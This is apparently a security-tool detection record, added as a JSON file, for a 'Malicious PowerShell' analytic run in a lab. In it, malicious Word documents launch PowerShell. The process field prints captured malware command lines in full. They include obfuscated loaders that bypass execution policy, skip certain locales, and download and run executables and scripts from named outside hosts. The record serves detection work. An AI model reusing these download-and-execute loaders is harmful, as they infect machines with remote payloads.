@@ -1,0 +1,83 @@
+{
+  "story": "Malicious PowerShell",
+  "last_detection_time": "2019-04-01 20:48:07",
+  "entities": [
+    {
+      "process_name": {
+        "count": 1,
+        "entity_results": [
+          "powershell.exe"
+        ]
+      },
+      "dest": {
+        "count": 1,
+        "entity_results": [
+          "spear-win10-1"
+        ]
+      },
+      "user": {
+        "count": 1,
+        "entity_results": [
+          "SPEAR-WIN10-1\\vagrant"
+        ]
+      }
+    }
+  ],
+  "first_detection_time": "2019-04-01 19:37:59",
+  "detection_results": [
+    {
+      "process_name": "powershell.exe",
+      "count": "10",
+      "lastTime": "04/01/2019 20:48:07",
+      "dest": "spear-win10-1",
+      "parent_process": [
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\subdirs\\15-4\\0504b6277d7148d49639aaa11c021f0209ad9b069a416c7a16b51046164470b0.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\subdirs\\15-4\\1406a03b9c3b1942ed454bd9d48f66ed7f0b7a4b48d936f0a8788650cecca703.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\subdirs\\15-6\\4134c7efd5bd2f8894e8311031959ffa637e324e127366dfa133f538096f215a.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\word_docs_malicous\\0deaf915e66c138d21013af78f5d7767612a15ce5cde47d2dc79cdcc4d0adfb3.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\word_docs_malicous\\15-1\\1a5f05fef1bb17e3d66b1ed2f14e68e3021f0e9d8d6c02543122b7b4800551f1.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\word_docs_malicous\\15-1\\2c5da5f76808b9fc6f4b7a1105d2f69816fa264f7d713c36d0600569b3c21616.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\word_docs_malicous\\15-1\\3d3f497a038e3061a11ee8ce239700d928c40d25b764934003690d6748db0bee.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\word_docs_malicous\\15-2\\0deaf915e66c138d21013af78f5d7767612a15ce5cde47d2dc79cdcc4d0adfb3.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\word_docs_malicous\\15-2\\3d6054df4f707e2695c390bde3519bebcfc2f78c64f8b0ea4284fad291b18184.doc\" /o \"\"",
+        "\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\vagrant\\malware\\word_docs_malicous\\15-3\\26de80e3bbbe1f053da4131ca7a405644b7443356ec97d48517f1ab86d5f1ca5.doc\" /o \"\""
+      ],
+      "firstTime": "04/01/2019 19:37:59",
+      "parent_process_name": "WINWORD.EXE",
+      "user": "SPEAR-WIN10-1\\vagrant",
+      "process": [
+        "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe  $doexiyeaiopoggkxi='zeca.ex';$eycweujtiaoyud='e'')';$wiikoniaorhprr='ath;';$hxxaiiyeaaanxakieiyy='DownloadF';$pmpxuysnamspjearkefeaucxu='dzHx';$suilpeodivxmiiiry42='path=';$gbilzeaoeywhsyq7='ss $p';$ajjtytlubxiysozdlpf0='ile(''';$yhuiioypjtfeufktgicryu='oce';$oqsausfciozcjlia='ope Proce';$bfsopptyqozzbeunziyoplv2='''esher';$ezhodvhxnwtaoygygosszy=' = ';$ehbnxpmsaxyygciyoflvumw3='ient).';$gxnordauamdyjmcx='ss; $';$nelaspyidjynxgmumy='temp+''\\ev';$osvxtcscuahtbbyokjwjoruqii5='t-Pr';$iauadopkalhrrfuwcptet='hp'',';$aecnwuehebzaaoimt='http://dn';$eetpupmzxtxfoviu31='$rbers';$iiulludssnwvskcui0='licy B';$xcedbmvuiemlvefwinpfaowlpy='($env:';$jyovvmrojctucnznqi=';(N';$chsadccofjkboyea='th); Star';$bbqlzpisaauenv50='h'';Set';$yqiejhidxugtyhthedbzjmwe='ecutionPo';$egpfxccyodttsdzyetxom80='-Ex';$tbogciqfhdwkilaha='lFx.p';$zkledyeyybicbzblxwwddoe30='olers.org';$bismuyzjooedkei3=' System.';$frqniliuuddiaoarbeu='heh';$tcsoiooaerjclzxebbhooqdond='ew-Object';$zatedjcbqapzcsoqmixgiiil='ypass -Sc';$eaqddikktiaurcayyzzvrcoy00='s.spo';$acjxwqaascrwuvxhvtqorkiyav='/DBA';$bibsnyyicjdaimuirk='$pa';$fgheuipjbqinivqdriloj='Net.Webcl'; Invoke-Expression ($eetpupmzxtxfoviu31+$frqniliuuddiaoarbeu+$ezhodvhxnwtaoygygosszy+$bfsopptyqozzbeunziyoplv2+$bbqlzpisaauenv50+$egpfxccyodttsdzyetxom80+$yqiejhidxugtyhthedbzjmwe+$iiulludssnwvskcui0+$zatedjcbqapzcsoqmixgiiil+$oqsausfciozcjlia+$gxnordauamdyjmcx+$suilpeodivxmiiiry42+$xcedbmvuiemlvefwinpfaowlpy+$nelaspyidjynxgmumy+$doexiyeaiopoggkxi+$eycweujtiaoyud+$jyovvmrojctucnznqi+$tcsoiooaerjclzxebbhooqdond+$bismuyzjooedkei3+$fgheuipjbqinivqdriloj+$ehbnxpmsaxyygciyoflvumw3+$hxxaiiyeaaanxakieiyy+$ajjtytlubxiysozdlpf0+$aecnwuehebzaaoimt+$eaqddikktiaurcayyzzvrcoy00+$zkledyeyybicbzblxwwddoe30+$acjxwqaascrwuvxhvtqorkiyav+$pmpxuysnamspjearkefeaucxu+$tbogciqfhdwkilaha+$iauadopkalhrrfuwcptet+$bibsnyyicjdaimuirk+$chsadccofjkboyea+$osvxtcscuahtbbyokjwjoruqii5+$yhuiioypjtfeufktgicryu+$gbilzeaoeywhsyq7+$wiikoniaorhprr);",
+        "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy bypass IEX (New Net.WebClient).DownloadString('https://www.google.com')",
+        "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -Command if( (Get-UICulture).Name -match 'RU|UA|BY|CN'){ exit; };$bafczyj = [System.IO.Path]::GetTempPath();$yicju = Join-Path $bafczyj 'Taskhoste.exe';$eaujtai='http://cloud.diminishedvaluecalifornia.com/501?bgyji';$ywxsf = Join-Path $bafczyj 'SearchI32.js';$eudasdu='http://cash.andreachiocca.com/loadercrypt_823EF8A810513A4071485C36DDAD4CC3.php?vid=pecdoc';$tubxe='(NewtyRtCzy-OtyRtCzybject tyRtCzyNet.WebtyRtCzyCtyRtCzylient).DowtyRtCzyntyRtCzyltyRtCzyoadFiltyRtCzye($tyRtCzyeudasdu,$ywtyRtCzyxsf);' -replace 'tyRtCzy','';iex $tubxe;Start-Process $ywxsf;$gvyau='(SW896CzNSW896Czew-SW896CzObjSW896Czect SW896CzNSW896Czet.WebSW896CzClient)SW896Cz.SW896CzDownSW896CzlSW896CzoSW896CzadSW896CzFile($eaSW896Czujtai,$yicjSW896Czu)SW896Cz;' -replace 'SW896Cz','';iex $gvyau;Start-Process $yicju;",
+        "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -Command if( (Get-UICulture).Name -match 'RU|UA|BY|CN'){ exit; };$byvid = [System.IO.Path]::GetTempPath();$sicvz = Join-Path $byvid"
+      ]
+    }
+  ],
+  "mappings": {
+    "mitre_attack": [
+      "Execution",
+      "PowerShell",
+      "Scripting"
+    ],
+    "nist": [
+      "PR.PT",
+      "DE.CM",
+      "PR.IP"
+    ],
+    "cis20": [
+      "CIS 3",
+      "CIS 7",
+      "CIS 8"
+    ],
+    "kill_chain_phases": [
+      "Command and Control",
+      "Actions on Objectives"
+    ]
+  },
+  "executed_by": "admin",
+  "support_search_name": [
+    "No Support or Baseline search in this Analytic Story"
+  ],
+  "detection_result_count": "1",
+  "detection_search_name": "ESCU - Malicious PowerShell Process - Connect To Internet With Hidden Window - Rule"
+}
